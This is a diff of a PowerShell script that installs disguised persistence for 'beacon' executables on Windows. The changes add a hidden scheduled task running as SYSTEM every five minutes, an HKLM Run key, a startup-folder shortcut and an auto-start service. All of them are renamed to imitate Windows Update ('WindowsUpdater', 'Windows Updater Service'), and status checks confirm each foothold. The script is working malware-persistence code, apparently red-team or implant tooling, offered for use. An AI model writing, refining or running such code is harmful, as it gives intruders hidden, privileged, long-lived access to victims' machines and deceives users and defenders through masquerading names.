@@ -4,7 +4,7 @@
 $beaconPaths = @(
     "C:\ProgramData\wininfo\info.exe",
     "C:\Windows\Temp\windata\windata.exe",
-    "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Windows\winupdate\wupdate.exe",
+    "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Windows\winupdater\wupdater.exe",
     "C:\ProgramData\Microsoft\Windows\winsvc\wsvc.exe",
     "C:\Windows\System32\Tasks\taskhost.exe"
 )
@@ -12,17 +12,18 @@ $beaconPaths = @(
 # 1. Create scheduled task (5-minute interval)
 Write-Host "[+] Creating scheduled task persistence..."
 $action = New-ScheduledTaskAction -Execute $beaconPaths[0]
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
-$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-Register-ScheduledTask -TaskName "WindowsUpdater" -Action $action -Trigger $trigger -Settings $settings -Force
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365) 
+$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName "WindowsUpdater" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
 
 # 2. Registry Run Key (runs on login)
 Write-Host "[+] Creating registry run key persistence..."
-New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateSvc" -Value $beaconPaths[1] -PropertyType String -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdaterSvc" -Value $beaconPaths[1] -PropertyType String -Force
 
 # 3. Startup Folder
 Write-Host "[+] Creating startup folder persistence..."
-$startupPath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.lnk"
+$startupPath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($startupPath)
 $shortcut.TargetPath = $beaconPaths[2]
@@ -30,7 +31,7 @@ $shortcut.Save()
 
 # 4. Service Persistence
 Write-Host "[+] Creating service persistence..."
-New-Service -Name "WinUpdateSvc" -BinaryPathName $beaconPaths[3] -DisplayName "Windows Update Service" -StartupType Automatic -Description "Provides support for Windows Update services" -ErrorAction SilentlyContinue
+New-Service -Name "WinUpdaterSvc" -BinaryPathName $beaconPaths[3] -DisplayName "Windows Updater Service" -StartupType Automatic -Description "Provides support for Windows Updater services" -ErrorAction SilentlyContinue
 
 # 5. Scheduled Task Backdoor (modify existing task)
 Write-Host "[+] Creating scheduled task backdoor..."
@@ -72,17 +73,17 @@ Write-Host "----------------------------------------"
 
 # Status Checks
 Write-Host "`n[*] Checking Scheduled Task persistence..."
-$task = Get-ScheduledTask -TaskName "WindowsUpdate" -ErrorAction SilentlyContinue
+$task = Get-ScheduledTask -TaskName "WindowsUpdater" -ErrorAction SilentlyContinue
 if ($task) {
-    Write-Host "[√] Scheduled Task 'WindowsUpdate' installed successfully."
+    Write-Host "[√] Scheduled Task 'WindowsUpdater' installed successfully."
 } else {
     Write-Host "[✗] Scheduled Task installation failed."
 }
 
 Write-Host "`n[*] Checking Registry Run Key persistence..."
-$runKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateSvc" -ErrorAction SilentlyContinue
+$runKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdaterSvc" -ErrorAction SilentlyContinue
 if ($runKey) {
-    Write-Host "[√] Registry Run Key 'WindowsUpdateSvc' set successfully."
+    Write-Host "[√] Registry Run Key 'WindowsUpdaterSvc' set successfully."
 } else {
     Write-Host "[✗] Registry Run Key installation failed."
 }
@@ -95,9 +96,9 @@ if (Test-Path $startupPath) {
 }
 
 Write-Host "`n[*] Checking Service persistence..."
-$service = Get-Service -Name "WinUpdateSvc" -ErrorAction SilentlyContinue
+$service = Get-Service -Name "WinUpdaterSvc" -ErrorAction SilentlyContinue
 if ($service) {
-    Write-Host "[√] Service 'WinUpdateSvc' created successfully."
+    Write-Host "[√] Service 'WinUpdaterSvc' created successfully."
     Write-Host "    Status: $($service.Status)"
     Write-Host "    Startup Type: $($service.StartType)"
 } else {
